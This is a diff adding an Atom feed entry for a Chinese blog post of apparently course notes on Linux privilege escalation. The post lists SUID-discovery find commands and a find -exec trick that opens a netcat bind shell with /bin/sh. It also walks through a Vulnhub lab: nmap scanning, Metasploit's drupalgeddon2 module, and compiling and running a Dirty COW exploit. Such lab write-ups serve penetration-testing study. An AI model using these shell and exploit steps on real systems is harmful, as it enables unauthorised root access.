@@ -156,4 +156,37 @@
     
   </entry>
   
+  <entry>
+    <title>权限提升-Linux脏牛内核漏洞&amp;SUID&amp;信息收集</title>
+    <link href="https://coldrainh.github.io/2021/10/09/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E8%84%8F%E7%89%9B%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E&amp;SUID&amp;%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
+    <id>https://coldrainh.github.io/2021/10/09/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Linux%E8%84%8F%E7%89%9B%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E&amp;SUID&amp;%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</id>
+    <published>2021-10-09T07:31:08.000Z</published>
+    <updated>2021-10-13T07:22:57.163Z</updated>
+    
+    <content type="html"><![CDATA[<p>linux提权一般放置tmp目录，临时目录，一般可读写，可执行.sh是linux可执行文件<br />运行：./linux.x.x.x.x.sh<br />perl对应的是 pl<br />有本地用户，就本地提权，没有就通过MSF提权<br /><strong><span id="more"></span>#案例1.Linux提权自动化脚本利用-4个脚本</strong><br />两个信息收集：LinEnum，linuxprivchecker<br />为后续的提权方法提供基础，<br />两个漏洞探针：linux-exploit-suggester linux-exploit-suggester2<br /><br><br /><strong>#案例2.LInux提权SUID配合脚本演示-Web</strong><br />漏洞成因：chmod u+s 给予了 suid u-s删除了suid<br />使程序在运行过程中受到lsuid root权限的执行过程导致<br />（普通用户执行，实际是以root权限执行）<br />提权过程：探针是否有SUID（手工或脚本）-特定SUID利用-利用吃瓜-GG</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">find / -user root -perm -4000 -print 2&gt;/dev/null</span><br><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br><span class="line">find / -user root -perm -4000 -exec ls -ldb &#123;&#125; \;</span><br></pre></td></tr></table></figure><p>参考利用：<a href="https://pentestlab.blog/2017/09/25/suid-executables/">https://pentestlab.blog/2017/09/25/suid-executables/</a><br />touch xiaodi <br />find xiaodi -exec whoami ; <br />ind xiaodi -exec netcat -lvp 5555 -e /bin/sh ; <br />netcat xx.xx.xx.xx 5555<br />0x01.得到webshell权限<br /><img src="https://img-blog.csdnimg.cn/img_convert/59684267f8d60f9f4de76a62e3d5cb0c.png" alt="image.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">gcc 45010.c -o 45010</span><br><span class="line">chmod +x 45010</span><br><span class="line">./45010</span><br><span class="line">id</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>#案例4.LInux提权脏牛内核漏洞演示-Vulnhub</strong><br />内核提权整个过程：（linux-exploit-suggester 获取信息哦） <br />vulnhub 靶机-探针目标-CMS 漏洞利用-脚本探针提权漏洞-利用内核提权-GG 内核漏洞<br />提权过程：寻可用-下 exp-上/tmp-编译 exp-执行(无权限用 chmod)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">nmap 192.168.76.0/24</span><br><span class="line">nmap -p1-65535 192.168.76.141</span><br><span class="line">search drupal</span><br><span class="line">use exploit/unix/webapp/drupal_drupalgeddon2</span><br><span class="line">set lhost 192.168.76.141</span><br><span class="line">set lport 1898</span><br><span class="line">set target 0</span><br><span class="line">run</span><br><span class="line">upload /tmp/40837.cpp /tmp/40837.cpp</span><br><span class="line">g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil</span><br><span class="line">python -c &#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;#利用python生成可交互式shell</span><br><span class="line">./dcow</span><br></pre></td></tr></table></figure><p>脏牛漏洞：<br /><a href="https://paper.seebug.org/483/#_4">https://paper.seebug.org/483/#_4</a><br>ps://paper.seebug.org/483/#_4)</p>]]></content>
+    
+    
+    <summary type="html">&lt;p&gt;linux提权一般放置tmp目录，临时目录，一般可读写，可执行.sh是linux可执行文件&lt;br /&gt;运行：./linux.x.x.x.x.sh&lt;br /&gt;perl对应的是 pl&lt;br /&gt;有本地用户，就本地提权，没有就通过MSF提权&lt;br /&gt;&lt;strong&gt;</summary>
+    
+    
+    
+    <category term="内网渗透" scheme="https://coldrainh.github.io/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
+    
+    <category term="权限提升" scheme="https://coldrainh.github.io/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/"/>
+    
+    <category term="小迪安全" scheme="https://coldrainh.github.io/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/"/>
+    
+    
+    <category term="渗透测试" scheme="https://coldrainh.github.io/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
+    
+    <category term="内网渗透" scheme="https://coldrainh.github.io/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
+    
+    <category term="权限提升" scheme="https://coldrainh.github.io/tags/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/"/>
+    
+    <category term="小迪安全" scheme="https://coldrainh.github.io/tags/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/"/>
+    
+    <category term="linux" scheme="https://coldrainh.github.io/tags/linux/"/>
+    
+  </entry>
+  
 </feed>
